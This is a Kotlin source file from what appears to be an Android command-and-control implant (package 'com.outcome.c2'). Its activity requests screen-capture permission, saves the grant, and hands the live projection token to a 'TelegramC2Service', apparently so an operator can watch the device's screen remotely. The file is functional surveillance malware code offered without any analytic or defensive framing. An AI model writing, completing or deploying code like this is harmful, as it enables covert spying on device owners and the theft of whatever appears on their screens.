package com.outcome.c2

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle

class MediaProjectionSetupActivity : Activity() {
    private val REQ = 0xC2

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        LogBus.append(applicationContext, "MP", "onCreate: requesting permission")
        val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        startActivityForResult(mpm.createScreenCaptureIntent(), REQ)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        LogBus.append(applicationContext, "MP", "onActivityResult result=$resultCode hasData=${data != null}")
        if (requestCode == REQ && resultCode == RESULT_OK && data != null) {
            getSharedPreferences("c2", MODE_PRIVATE).edit()
                .putInt("proj_code", resultCode)
                .putString("proj_data", data.toUri(0))
                .apply()

            // Send the live Intent to TelegramC2Service only.
            // Do NOT send to C2Service — that would consume the token.
            val svc = Intent(this, TelegramC2Service::class.java).apply {
                action = "START_PROJECTION"
                putExtra("proj_result_code", resultCode)
                putExtra("proj_data", data)
            }
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                    startForegroundService(svc)
                else
                    startService(svc)
                LogBus.append(applicationContext, "MP", "TelegramC2Service notified")
            } catch (e: Exception) {
                LogBus.append(applicationContext, "MP", "start service failed: ${e.message}")
            }
        } else {
            LogBus.append(applicationContext, "MP", "denied/cancelled")
        }
        finish()
    }
}
